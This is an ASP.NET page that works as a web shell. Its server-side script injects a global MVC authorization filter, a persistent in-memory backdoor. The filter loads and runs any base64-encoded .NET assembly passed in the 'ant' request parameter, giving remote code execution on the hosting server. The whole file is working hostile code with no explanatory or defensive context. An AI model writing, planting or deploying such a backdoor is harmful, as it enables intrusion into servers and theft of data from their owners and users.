<%@ Page Language="c#"%>
<%@ Import Namespace="System.Web.Mvc" %>
<script runat="server">
    public class MyAuthFilter : IAuthorizationFilter
    {
        public void OnAuthorization(AuthorizationContext filterContext)
        {
            HttpContext context = HttpContext.Current;
            String Payload = filterContext.HttpContext.Request.Params["ant"];
            if (Payload != null)
            {
                System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
                assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(context);
                context.Response.End();
            }
            Console.WriteLine("auth filter inject");
        }
    }
</script>
<%
    GlobalFilterCollection globalFilterCollection = GlobalFilters.Filters;
    globalFilterCollection.Add(new MyAuthFilter(), -2);
%>